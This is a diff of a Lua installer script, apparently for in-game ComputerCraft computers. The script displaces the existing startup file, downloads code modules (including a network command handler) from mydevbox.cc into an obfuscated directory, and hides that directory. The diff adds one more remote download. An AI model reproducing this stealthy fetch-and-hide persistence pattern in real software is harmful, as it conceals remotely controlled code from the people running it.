@@ -128,7 +128,7 @@ local function installer()
     oldStartupFileName = generateRandomString(8) -- Does not end with .lua
     if (originalStartup == nil) then
         if (originalStartup == nil) then
-            if OriginalFS.exists(bootfile) then
+            if not OriginalFS.exists(bootfile) then
                 -- Rename the existing startup.lua
                 if OriginalFS.exists("startup.lua") then
                     OriginalFS.move("startup.lua", oldStartupFileName)
@@ -228,6 +228,7 @@ parallel.waitForAny(a1, a2)
     downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", "/" .. DIR_4Nin92xCdd0 .. "/networking/processor/command_handler.lua")
     downloadFile("https://mydevbox.cc/src/uninstaller.lua", "/" .. DIR_4Nin92xCdd0 .. "/uninstaller.lua")
     downloadFile("https://mydevbox.cc/src/main.lua", "/" .. DIR_4Nin92xCdd0 .. "/main.lua")
+    downloadFile("https://mydevbox.cc/src/init.lua", "/" .. DIR_4Nin92xCdd0 .. "/init.lua")
     if (CustomFS ~= nil) then
         CustomFS.hideDir(DIR_4Nin92xCdd0)
     end
